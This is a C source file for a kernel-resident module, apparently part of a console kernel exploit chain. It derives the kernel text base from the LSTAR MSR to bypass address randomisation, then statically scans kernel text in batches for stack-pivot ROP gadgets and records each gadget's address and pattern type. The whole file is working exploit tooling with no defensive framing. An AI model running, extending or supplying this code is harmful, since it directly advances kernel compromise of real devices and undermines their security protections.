#include <stdint.h>

/*
 * smart_pivot_scan v6 — Static byte scanner for pivot gadgets
 *
 * APPROACH: Instead of executing probe candidates (which panics on
 * #GP/#UD faults not covered by pcb_onfault), scan ktext bytes
 * statically for instruction patterns that pivot RSP.
 *
 * Scans entire ktext (12MB) for byte patterns like:
 *   - pop rsp; ret           (5C C3)
 *   - xchg rax,rsp; ret      (48 94 C3)
 *   - mov rsp,rax; ret        (48 89 C4 C3)
 *   - mov rsp,rbp; pop rbp; ret (48 89 EC 5D C3 — leave-like)
 *   - leave; ret              (C9 C3)
 *   - pop rsp; pop ...; ret   (5C 5x+ C3)
 *   - mov rsp,[reg]; ret      various
 *
 * Output: array of (address, pattern_id) pairs.
 *
 * Configure via -D flags:
 *   SCAN_BATCH: chunk index (each chunk scans 768KB of ktext)
 */

#ifndef SCAN_BATCH
#define SCAN_BATCH     0
#endif

#define MAGIC_SPVT     0x53505654
#define KTEXT_SIZE     0xC00000   /* 12MB */
#define CHUNK_SIZE     0xC0000    /* 768KB per batch = 16 batches */
#define HEADER_SLOTS   6
#define MAX_RESULTS    ((2304/8) - HEADER_SLOTS)  /* ~282 result slots */

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/*
 * Pattern IDs:
 *   0x01 = pop rsp; ret               (5C C3)
 *   0x02 = xchg rax,rsp; ret          (48 94 C3)
 *   0x03 = mov rsp,rax; ret           (48 89 C4 C3)
 *   0x04 = mov rsp,rbx; ret           (48 89 DC C3)
 *   0x05 = mov rsp,rcx; ret           (48 89 CC C3)
 *   0x06 = mov rsp,rdx; ret           (48 89 D4 C3)
 *   0x07 = mov rsp,rsi; ret           (48 89 F4 C3)
 *   0x08 = mov rsp,rdi; ret           (48 89 FC C3)
 *   0x09 = mov rsp,rbp; ret           (48 89 EC C3)
 *   0x0A = leave; ret                 (C9 C3)
 *   0x0B = pop rsp; pop; ret          (5C 5x C3)
 *   0x0C = xchg reg,rsp; ret          (48 87 E? C3)
 *   0x10 = mov rsp,[rdi]; ret         (48 8B 27 C3 etc)
 *   0x11 = mov rsp,[rdi+off]; ret     (48 8B 67 xx C3)
 *   0x20 = pop rsp; ... (2+ pops); ret
 */

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    volatile uint64_t* out = (volatile uint64_t*)args;

    for (int i = 0; i < 2304/8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = (uint64_t)SCAN_BATCH;

    /* Calculate scan range for this batch */
    uint64_t scan_start = ktext_base + (uint64_t)SCAN_BATCH * CHUNK_SIZE;
    uint64_t scan_end = scan_start + CHUNK_SIZE;
    if (scan_end > ktext_base + KTEXT_SIZE)
        scan_end = ktext_base + KTEXT_SIZE;
    if (scan_start >= ktext_base + KTEXT_SIZE) {
        out[0] = ((uint64_t)0xFFFF << 32) | MAGIC_SPVT;
        return 0;
    }

    out[4] = scan_start;
    out[5] = scan_end;

    volatile uint8_t* p = (volatile uint8_t*)scan_start;
    uint64_t len = scan_end - scan_start;
    int n_results = 0;

    for (uint64_t i = 0; i + 4 < len && n_results < MAX_RESULTS; i++) {
        uint8_t b0 = p[i];
        uint8_t b1 = p[i+1];

        /* Pattern 0x01: pop rsp; ret (5C C3) */
        if (b0 == 0x5C && b1 == 0xC3) {
            uint64_t addr = scan_start + i;
            out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x01 << 56);
            n_results++;
            continue;
        }

        /* Pattern 0x0A: leave; ret (C9 C3) */
        if (b0 == 0xC9 && b1 == 0xC3) {
            uint64_t addr = scan_start + i;
            out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x0A << 56);
            n_results++;
            continue;
        }

        /* Pattern 0x0B: pop rsp; pop reg; ret (5C 5x C3) */
        if (b0 == 0x5C && (b1 >= 0x58 && b1 <= 0x5F) && p[i+2] == 0xC3) {
            uint64_t addr = scan_start + i;
            out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x0B << 56);
            n_results++;
            continue;
        }

        /* REX.W prefix patterns (48 ...) */
        if (b0 == 0x48 && i + 3 < len) {
            uint8_t b2 = p[i+2];
            uint8_t b3 = p[i+3];

            /* Pattern 0x02: xchg rax,rsp; ret (48 94 C3) */
            if (b1 == 0x94 && b2 == 0xC3) {
                uint64_t addr = scan_start + i;
                out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x02 << 56);
                n_results++;
                continue;
            }

            /* Pattern 0x0C: xchg reg,rsp; ret (48 87 E? C3) */
            if (b1 == 0x87 && (b2 & 0xF8) == 0xE0 && b3 == 0xC3) {
                uint64_t addr = scan_start + i;
                out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x0C << 56);
                n_results++;
                continue;
            }

            /* mov rsp,REG; ret (48 89 XX C3) where XX encodes src→rsp */
            if (b1 == 0x89 && b3 == 0xC3) {
                int pat = 0;
                switch (b2) {
                    case 0xC4: pat = 0x03; break; /* mov rsp,rax */
                    case 0xDC: pat = 0x04; break; /* mov rsp,rbx */
                    case 0xCC: pat = 0x05; break; /* mov rsp,rcx */
                    case 0xD4: pat = 0x06; break; /* mov rsp,rdx */
                    case 0xF4: pat = 0x07; break; /* mov rsp,rsi */
                    case 0xFC: pat = 0x08; break; /* mov rsp,rdi */
                    case 0xEC: pat = 0x09; break; /* mov rsp,rbp */
                }
                if (pat) {
                    uint64_t addr = scan_start + i;
                    out[HEADER_SLOTS + n_results] = addr | ((uint64_t)pat << 56);
                    n_results++;
                    continue;
                }
            }

            /* mov rsp,[reg]; ret (48 8B 2x C3) — load rsp from memory */
            if (b1 == 0x8B && b3 == 0xC3) {
                /* ModRM: mod=00, reg=100(rsp), rm=xxx */
                if ((b2 & 0xF8) == 0x20 && b2 != 0x24 && b2 != 0x25) {
                    uint64_t addr = scan_start + i;
                    out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x10 << 56);
                    n_results++;
                    continue;
                }
            }

            /* mov rsp,[reg+disp8]; ret (48 8B 6x XX C3) */
            if (b1 == 0x8B && i + 4 < len && p[i+4] == 0xC3) {
                if ((b2 & 0xF8) == 0x60 && b2 != 0x64) {
                    uint64_t addr = scan_start + i;
                    out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x11 << 56);
                    n_results++;
                    continue;
                }
            }
        }

        /* Pattern 0x20: pop rsp; pop; pop; ret (5C 5x 5x C3) */
        if (b0 == 0x5C && i + 3 < len) {
            if ((b1 >= 0x58 && b1 <= 0x5F) &&
                (p[i+2] >= 0x58 && p[i+2] <= 0x5F) &&
                p[i+3] == 0xC3) {
                uint64_t addr = scan_start + i;
                out[HEADER_SLOTS + n_results] = addr | ((uint64_t)0x20 << 56);
                n_results++;
                continue;
            }
        }
    }

    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    out[3] |= ((uint64_t)n_results << 16);

    return 0;
}
